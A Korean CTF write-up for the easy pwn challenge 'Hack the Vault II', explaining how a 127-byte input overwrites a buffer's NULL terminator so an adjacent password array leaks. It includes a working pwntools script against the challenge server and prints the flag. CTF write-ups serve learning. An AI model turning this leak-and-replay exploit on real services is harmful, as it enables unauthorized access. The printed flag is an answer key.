---
ctf_name: "BushBashCTF"
challenge_name: "Hack the Vault II"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-07-31"
points: 100
tags: [buffer-over-read]
---

# 문제명

## 문제 설명

> The Moss Man is on the run, quick! Detective Kane needs your help.

- `vault.c` 제공
- nc 34.40.133.67 7778

## 풀이

### 분석

문제에서 제공된 바이너리 파일이 없기 때문에, 적용된 보호 기법은 알 수 없다. 하지만 C 코드를 제공하고 있으므로 코드는 분석할 수 있다. 코드를 확인해보면 `buffer`와 `password` 배열이 존재한다. 두 배열은 다음과 같이 선언되어 있다.

```C
char array[127 + 64];
char *buffer = &array[0];
char *password = &array[127];
```

이때 `buffer`에 입력은 127바이트까지 받을 수 있고 마지막 바이트는 NULL로 덮어 씌어진다. 그런데 `password` 배열이 array[127]에서 시작되기 때문에 `buffer`에 127바이트를 입력하게되면 buffer 배열의 NULL 바이트를 덮어 쓸 수 있게 된다.

### 취약점

`buffer` 배열의 마지막 바이트를 `password` 배열로 덮어 쓸 수 있기 때문에 이를 이용하여 출력시 `password`를 leak할 수 있다. 또한 확인해보면, password 값이 계속해서 변하는 것이 아닌, 동일한 파일에서 계속해서 동일한 값으로 가져오는 것이기 때문에 leak하게 된 password를 입력으로 다음 실행에서 넣어줄 수 있다.

### 익스플로잇

```python
from pwn import *

p = remote("34.40.133.67", 7778)

p.sendlineafter(b'Enter the password: ', b'A'*127)
p.recvuntil(b'A'*127)
password = p.recvline().decode()

success(f'{password}=')

p.close()

p = remote("34.40.133.67", 7778)
p.sendlineafter(b'Enter the password: ', password.encode())

p.interactive()
```

## 플래그

```
bushbash{1nto-th3-bUsh-w3-Go}
```

## 배운 점

- 일반적인 pwnable 문제는 아니었지만, 버퍼의 마지막 부분을 덮어쓰면서 NULL을 없애서 값을 leak할 수 있다는 것을 배우게 되었다.